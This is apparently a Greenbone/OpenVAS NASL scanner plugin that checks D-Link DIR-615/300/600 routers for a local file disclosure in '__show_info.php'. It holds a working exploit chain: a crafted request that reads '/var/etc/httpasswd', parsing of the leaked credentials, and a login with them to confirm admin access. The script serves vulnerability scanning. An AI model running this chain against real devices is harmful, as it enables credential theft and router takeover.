if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103858" );
	script_bugtraq_id( 64043 );
	script_version( "2021-04-19T11:57:41+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-19 11:57:41 +0000 (Mon, 19 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-12-16 14:34:55 +0100 (Mon, 16 Dec 2013)" );
	script_name( "Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_dlink_dsl_detect.sc", "gb_dlink_dap_detect.sc", "gb_dlink_dir_detect.sc", "gb_dlink_dwr_detect.sc" );
	script_mandatory_keys( "Host/is_dlink_device" );
	script_require_ports( "Services/www", 80, 8080 );
	script_tag( name: "impact", value: "Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on devices running
  the vulnerable application. This may aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request which tries to read '/var/etc/httpasswd'" );
	script_tag( name: "insight", value: "The remote D-Link device fails to adequately validate user supplied input
  to 'REQUIRE_FILE' in '__show_info.php'" );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "summary", value: "Multiple D-Link DIR series routers are prone to a local file-
  disclosure vulnerability because the routers fails to adequately validate user- supplied input." );
	script_tag( name: "affected", value: "DIR-615 / DIR-300 / DIR-600.

  Other devices and models might be affected as well." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
CPE_PREFIX = "cpe:/o:d-link";
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd";
req = http_get( item: url, port: port );
buf = http_send_recv( port: port, data: req );
if(!IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || !ContainsString( buf, "<center>" )){
	exit( 99 );
}
creds = eregmatch( pattern: "<center>.*([a-zA-Z0-9]+:[a-zA-Z0-9]+)[^a-zA-Z0-9]*</center>", string: buf );
lines = split( buf );
x = 0;
for line in lines {
	x++;
	if(ContainsString( line, "<center>" )){
		for(i = x;i < max_index( lines );i++){
			if(ContainsString( lines[i], "</center>" )){
				break;
			}
			user_pass = eregmatch( pattern: "([a-zA-Z0-9]+:[a-zA-Z0-9]+)", string: lines[i] );
			if(!isnull( user_pass[1] )){
				ul[p++] = chomp( user_pass[1] );
				continue;
			}
		}
	}
}
if(max_index( ul ) < 1){
	exit( 99 );
}
url2 = dir + "/tools_admin.php";
req = http_get( item: url2, port: port );
buf = http_send_recv( port: port, data: req );
if(!ContainsString( buf, "LOGIN_USER" )){
	exit( 0 );
}
for p in ul {
	u = split( buffer: p, sep: ":", keep: FALSE );
	if(isnull( u[0] )){
		continue;
	}
	user = u[0];
	pass = u[1];
	url2 = dir + "/login.php";
	login_data = "ACTION_POST=LOGIN&LOGIN_USER=" + user + "&LOGIN_PASSWD=" + pass;
	req = http_post( item: url2, port: port, data: login_data );
	buf = http_send_recv( port: port, data: req );
	if(!IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	url2 = dir + "/tools_admin.php";
	req = http_get( item: url2, port: port );
	buf = http_send_recv( port: port, data: req );
	if(ContainsString( buf, "OPERATOR PASSWORD" ) && ContainsString( buf, "ADMIN PASSWORD" )){
		url2 = "/logout.php";
		req = http_get( item: url2, port: port );
		http_send_recv( port: port, data: req );
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

